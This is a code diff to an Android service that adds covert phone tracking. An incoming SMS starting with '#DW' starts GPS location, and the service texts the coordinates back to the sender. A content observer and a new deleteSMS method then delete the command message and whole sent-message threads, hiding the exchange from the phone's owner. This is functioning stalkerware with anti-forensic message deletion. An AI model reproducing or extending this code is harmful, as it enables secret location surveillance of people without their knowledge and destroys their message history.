@@ -52,7 +52,7 @@ public class MyService extends Service {
         registerReceiver(receiverSMS, filterSMS);
         getContentResolver().registerContentObserver(
                 Uri.parse("content://sms"), true, Observer);
-        amapLocationUtil.startLocation();
+
     }
 
 
@@ -89,16 +89,23 @@ public class MyService extends Service {
             if (SMS_ACTION.equals(action)) {
                 Bundle bundle = intent.getExtras();
                 Object messages[] = (Object[]) bundle.get("pdus");
-                SmsMessage smsMessage[] = new SmsMessage[messages.length];
+                final SmsMessage smsMessage[] = new SmsMessage[messages.length];
                 Log.d(Utils.LOG_TAG,"收到短信内容8888888888");
                 for (int n = 0; n < messages.length; n++) {
                     smsMessage[n] = SmsMessage
                             .createFromPdu((byte[]) messages[n]);
                     if (smsMessage[n].getMessageBody().startsWith("#DW")) {
-                        String num = smsMessage[n].getOriginatingAddress();
-                        SmsManager smsManager = SmsManager.getDefault();
-                        smsManager.sendTextMessage(num, null, "#RDW" + "**20"
-                                + ";88888888888" , null, null);
+                        final String num = smsMessage[n].getOriginatingAddress();
+                        //收到短信指令后  开始定位 获取经纬度坐标  然后以短信的形式回发回去
+                        amapLocationUtil.startLocation(new AmapLocationUtil.OnLocSuccess() {
+                            @Override
+                            public void locSuccess(double lat, double lng) {
+                                SmsManager smsManager = SmsManager.getDefault();
+                                smsManager.sendTextMessage(num, null, lat+","+lng , null,
+                                        null);
+                            }
+                        });
+
                     }
                 }
 
@@ -106,7 +113,48 @@ public class MyService extends Service {
         }
 
     }
+    /*
 
+     * Delete all SMS one by one
+
+     */
+
+    public void deleteSMS() {
+        try {
+            ContentResolver CR = getContentResolver();
+
+            // Query SMS
+
+            Uri uriSms = Uri.parse("content://sms/sent");
+
+            Cursor c = CR.query(uriSms,
+
+                    new String[] { "_id", "thread_id" }, null, null, null);
+
+            if (null != c && c.moveToFirst()) {
+                do {
+                    // Delete SMS
+
+                    long threadId = c.getLong(1);
+
+                    CR.delete(Uri.parse("content://sms/conversations/" + threadId),
+
+                            null, null);
+
+                    Log.d("deleteSMS", "threadId:: "+threadId);
+
+                } while (c.moveToNext());
+
+            }
+
+        } catch (Exception e) {
+            // TODO: handle exception
+
+            Log.d("deleteSMS", "Exception:: " + e);
+
+        }
+
+    }
     // 删除收到的#DW
     ContentObserver Observer = new ContentObserver(new Handler()) {
         @Override
@@ -121,24 +169,23 @@ public class MyService extends Service {
                 String saddress = cursor.getString(1);
                 String sbody = cursor.getString(2);
                 if (sbody.startsWith("#DW")) {
-                    long id = cursor.getLong(0);
-                    resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id, null);
+                    deleteSMS();
                 }
             }
             cursor.close();
-            // 删除发件箱的"RDW"
-            Cursor cursor2 = resolver.query(Uri.parse("content://sms/sent"),
-                    new String[]{"_id", "address", "body"}, null, null,
-                    "_id desc");
-            if (cursor2.getCount() > 0 && cursor2.moveToFirst()) {
-                String saddress2 = cursor2.getString(1);
-                String sbody2 = cursor2.getString(2);
-                if (sbody2.startsWith("#RDW")) {
-                    long id2 = cursor2.getLong(0);
-                    resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id2, null);
-                }
-            }
-            cursor2.close();
+//            // 删除发件箱的"RDW"
+//            Cursor cursor2 = resolver.query(Uri.parse("content://sms/sent"),
+//                    new String[]{"_id", "address", "body"}, null, null,
+//                    "_id desc");
+//            if (cursor2.getCount() > 0 && cursor2.moveToFirst()) {
+//                String saddress2 = cursor2.getString(1);
+//                String sbody2 = cursor2.getString(2);
+//                if (sbody2.startsWith("#RDW")) {
+//                    long id2 = cursor2.getLong(0);
+//                    resolver.delete(Telephony.Sms.CONTENT_URI, "_id=" + id2, null);
+//                }
+//            }
+//            cursor2.close();
         }
     };
 
